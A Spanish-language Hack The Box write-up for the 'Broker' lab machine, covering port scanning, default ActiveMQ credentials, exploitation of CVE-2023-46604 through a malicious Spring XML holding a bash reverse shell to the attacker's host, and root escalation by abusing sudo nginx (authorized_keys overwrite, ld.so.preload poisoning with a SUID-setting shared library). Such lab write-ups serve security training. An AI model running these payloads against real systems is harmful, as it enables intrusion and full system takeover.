---
tags:
  - type/writeup
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/578
dificultad: Fácil
ip: 10.10.11.243
os: Linux
relacionados:
  - "[[Default credentials]]"
  - "[[Remote Code Execution|RCE]]"
  - "[[CVE-2023-46604]]"
  - "[[Sudo abuse]]"
  - "[[nginx]]"
---
# HackTheBox - Broker
## Reconocimiento

### Escaneo de Puertos con Nmap

El escaneo inicial con `nmap` revela nueve puertos TCP abiertos:
```Bash
nmap -p- --min-rate 10000 10.10.11.243
```

```Plaintext
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-08 12:58 EST
Nmap scan report for 10.10.11.243
Host is up (0.097s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1883/tcp  open  mqtt
5672/tcp  open  amqp
8161/tcp  open  patrol-snmp
39751/tcp open  unknown
61613/tcp open  unknown
61614/tcp open  unknown
61616/tcp open  unknown
```

Un escaneo más detallado para identificar servicios y versiones:
```Bash
nmap -p 22,80,1883,5672,8161,39751,61613,61614,61616 -sCV 10.10.11.243
```

```Plaintext
Nmap scan report for 10.10.11.243
Host is up (0.092s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open  mqtt
5672/tcp  open  amqp?
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
39751/tcp open  tcpwrapped
61613/tcp open  unknown
61614/tcp open  http       Jetty 9.4.39.v20210325
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings:
|   NULL:
|     ActiveMQ
|     ProviderVersion
|_    5.15.15
```

**Evaluación de puertos:**
- **22/tcp (SSH):** OpenSSH 8.9p1. Útil para un acceso posterior.
- **80/tcp (HTTP):** Nginx 1.18.0. Requiere autenticación (`ActiveMQRealm`).
- **1883/tcp (MQTT) y 5672/tcp (AMQP):** Protocolos de mensajería, probablemente gestionados por ActiveMQ.
- **8161/tcp y 61614/tcp (HTTP):** Servidor web Jetty. El puerto 8161 también pide autenticación.
- **61613/tcp y 61616/tcp:** Relacionados con **[[ActiveMQ]]**. El puerto 61616 revela la versión **5.15.15**.
    
### Interfaz Web (Puerto 80)

Al navegar a `http://10.10.11.243`, se presenta un formulario de autenticación básica. Las credenciales por defecto `admin:admin` otorgan acceso al panel de administración de **[[ActiveMQ]]**.

La página de administración (`/admin/`) confirma la versión de ActiveMQ: **5.15.15**.


---

## Explotación de Vulnerabilidades

### Identificando la Vulnerabilidad: CVE-2023-46604

Una búsqueda rápida sobre "ActiveMQ 5.15.15 vulnerability" apunta directamente a **[[CVE-2023-46604]]**.
> [!BUG] CVE-2023-46604
> 
> - **Descripción:** Vulnerabilidad de ejecución remota de código (RCE) no autenticada en Apache ActiveMQ.
>     
> - **Puntuación CVSS:** 10.0 (Crítica).
>     
> - **Causa:** Deserialización insegura de datos en el protocolo OpenWire.
>     
> - **Versiones Afectadas:** Versiones de la rama 5.15 anteriores a la 5.15.16.
>     

La vulnerabilidad permite a un atacante enviar un paquete mal formado que, al ser procesado, hace que el servidor cargue una clase desde una URL externa (por ejemplo, un archivo XML de Spring) y ejecute código arbitrario.

### Explotación con PoC

Se utiliza un PoC público en Python para explotar la vulnerabilidad. El script requiere la IP del objetivo, el puerto (61616 por defecto) y una URL que apunte a un archivo XML malicioso.

**1. Preparar el archivo XML malicioso (`poc-linux.xml`)**

Este archivo contiene un payload para una reverse shell.
```XML
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <value>bash -i >&amp; /dev/tcp/MI_IP/9001 0>&amp;1</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

**2. Servir el archivo XML y poner un listener**
En la máquina atacante:
```Bash
# Servir el archivo XML
python3 -m http.server 80

# Poner un listener para la reverse shell
nc -lnvp 9001
```

**3. Ejecutar el exploit**
```Bash
python exploit.py -i 10.10.11.243 -u http://MI_IP/poc-linux.xml
```

El servidor web local recibe la petición GET para `poc.xml`, y el listener de `netcat` recibe una conexión entrante.
```Bash
nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.243 60298
bash: cannot set terminal process group (880): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$
```

Tras estabilizar la shell, se obtiene la bandera de usuario.


---

## Escalada de Privilegios 

### Enumeración de Privilegios

El comando `sudo -l` revela que el usuario `activemq` puede ejecutar `nginx` como `root` sin necesidad de contraseña.
```Bash
sudo -l

Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```
Este permiso es el vector de escalada de privilegios.

### Método 1: Servidor Nginx para Lectura/Escritura de Archivos

Se puede abusar del permiso de `sudo` para iniciar una instancia de `nginx` con una configuración personalizada que nos dé control total sobre el sistema de archivos.

**1. Configuración de Nginx para Lectura de Archivos**
Se crea un archivo de configuración (`nginx-read.conf`) que sirve el directorio raíz (`/`) del sistema.
```Nginx
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```

Se inicia el servidor:
```Bash
sudo /usr/sbin/nginx -c /dev/shm/nginx-read.conf
```

Ahora, se pueden leer archivos del sistema como `root` haciendo peticiones `curl` al puerto 1337.
```Bash
curl localhost:1337/root/root.txt
8a207d68************************
```

**2. Configuración de Nginx para Escritura de Archivos**
Para obtener una shell interactiva, se modifica la configuración para permitir peticiones `PUT` (`dav_methods PUT;`). Esto permitirá escribir archivos, como una clave SSH pública.
```Nginx
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1338;
        root /;
        autoindex on;
        dav_methods PUT; # Habilitar PUT
    }
}
```

Se inicia este nuevo servidor en un puerto diferente (ya que el anterior sigue corriendo).
```Bash
sudo /usr/sbin/nginx -c /dev/shm/nginx-write.conf
```

Se sube la clave pública SSH al `authorized_keys` de `root`:
```Bash
curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-ed25519 AAAAC3... your_key'
```

Finalmente, se accede por SSH como `root`.
```Bash
ssh -i id_ed25519 root@10.10.11.243
```

### Método 2: Abuso de `ld.so.preload` [Alternativo]

Esta técnica se basa en la explotación de la vulnerabilidad de Zimbra **[[CVE-2022-41347]]** y abusa de la directiva `error_log` de `nginx` para envenenar el archivo `ld.so.preload`.

> [!ATTENTION] ¿Qué es ld.so.preload?
> 
> El archivo /etc/ld.so.preload contiene una lista de objetos compartidos (.so) que se cargan antes de la ejecución de cualquier programa. Si podemos escribir en este archivo, podemos forzar al sistema a cargar una librería maliciosa al ejecutar cualquier binario, especialmente uno con permisos SUID como sudo.

**Pasos:**
- Crear una configuración de `nginx` que redirija el log de errores a `/etc/ld.so.preload`.
- Provocar un error en `nginx` para que escriba la ruta a una librería maliciosa en `ld.so.preload`.
- Crear la librería maliciosa (`.so`) que escale privilegios.
- Ejecutar un comando `sudo` para activar la carga de la librería.
- Iniciar Nginx con Log Malicioso


 1. **Configuración (nginx-preload.conf)**:
```Nginx
user root;
error_log /etc/ld.so.preload warn;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1339;
        root /;
    }
}
```

Iniciar el servidor:
```Bash
activemq@broker:~$ sudo /usr/sbin/nginx -c /tmp/nginx-preload.conf
```

2. **Envenenar ld.so.preload**
Se realiza una petición a un archivo inexistente. nginx registrará el error en /etc/ld.so.preload, incluyendo la ruta del archivo solicitado.
```Bash
# La primera petición genera el error.
# El archivo .so aún no debe existir.
curl localhost:1339/tmp/pwn.so
```

El contenido de /etc/ld.so.preload ahora será algo similar a:
```
2023/11/08 13:30:00 [error] 1234#1234: *1 open() "/tmp/pwn.so" failed (2: No such file or directory), ...
```

El enlazador dinámico intentará cargar /tmp/pwn.so (y otras palabras del log) como una librería.

3. **Crear el Objeto Compartido Malicioso**
Se crea un archivo C (pwn.c) que, al cargarse, otorga permisos SUID al binario bash.
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) pwn() {
    chown("/bin/bash", 0, 0);
    chmod("/bin/bash", 04755);
    unlink("/etc/ld.so.preload"); // Limpiar para no romper el sistema
}
```

Compilar como objeto compartido:
```Bash
gcc -shared -fPIC -o /tmp/pwn.so /tmp/pwn.c
```

4. **Activar el Payload**
Se ejecuta cualquier comando con sudo (incluso sudo -l). Esto cargará la librería /tmp/pwn.so con privilegios de root.
```Bash
sudo -l
```

Ahora, `/bin/bash` tiene el bit SUID activado.
```Bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

Se obtiene una shell de `root` simplemente ejecutando:
```Bash
/bin/bash -p
bash-5.1# id
uid=1001(activemq) gid=1001(activemq) euid=0(root) egid=0(root) groups=0(root),1001(activemq)
bash-5.1# whoami
root
```


___

## Bandera(s)

> [!FLAG] `flag{user}`
> 2bc3e7d7c036e22803bdbb6d771cc839
^bandera

> [!FLAG] `flag{root}`
9209cc8bcb89cd4344ca039ca5efc7f1
^bandera